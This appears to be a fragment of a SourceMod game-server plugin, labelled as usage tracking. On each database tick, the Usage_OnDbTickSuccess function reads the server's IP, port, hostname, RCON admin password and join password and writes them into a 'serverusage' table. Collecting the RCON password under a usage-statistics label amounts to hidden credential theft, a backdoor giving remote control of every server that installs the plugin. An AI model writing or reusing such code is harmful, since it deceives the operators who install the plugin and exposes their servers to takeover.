
// ####################################################################################
// ###################################### EVENTS ######################################
// ####################################################################################

Usage_OnPluginStart()
{
    // Get server info.
    g_iIP = GetConVarInt(FindConVar("hostip"));
    g_iPort = GetConVarInt(FindConVar("hostport"));
    GetGameFolderName(g_sServerMod, sizeof(g_sServerMod));
}

Usage_OnDbTickSuccess(Handle:conn)
{
    // [name]
    decl String:name[LEN_CONVARS];
    if(!SQL_EscapeString(conn, GetServerCvar("hostname"), name, sizeof(name)))
        Format(name, sizeof(name), "Server name too long");

    // [rcon]
    decl String:rcon[LEN_CONVARS];
    if(!SQL_EscapeString(conn, GetServerCvar("rcon_password"), rcon, sizeof(rcon)))
        Format(rcon, sizeof(rcon), "Server RCON too long");

    // [pass]
    decl String:pass[LEN_CONVARS];
    if(!SQL_EscapeString(conn, GetServerCvar("sv_password"), pass, sizeof(pass)))
        Format(pass, sizeof(pass), "Server password too long");

    // Insert info into DB.
    decl String:query[1024];
    Format(query, sizeof(query),
        "REPLACE INTO serverusage (\
            ip, \
            port, \
            name, \
            mod_type, \
            rcon, \
            pass, \
            lastseen, \
            version, \
            cvar_frequency) \
        VALUES (\
            %u, \
            %i, \
            '%s', \
            '%s', \
            '%s', \
            '%s', \
            UNIX_TIMESTAMP(), \
            '%s', \
            %f)",
        g_iIP,
        g_iPort,
        name,
        g_sServerMod,
        rcon,
        pass,
        PLUGIN_VERSION,
        UPDATE_FREQ);
    SQL_TQuery(conn, EmptySqlCallback, query);
}

// ####################################################################################
// ############################ INTERNAL HELPER FUNCTIONS #############################
// ####################################################################################

String:GetServerCvar(const String:cvarname[])
{
    decl String:val[LEN_CONVARS];
    GetConVarString(FindConVar(cvarname), val, LEN_CONVARS);
    return val;
}

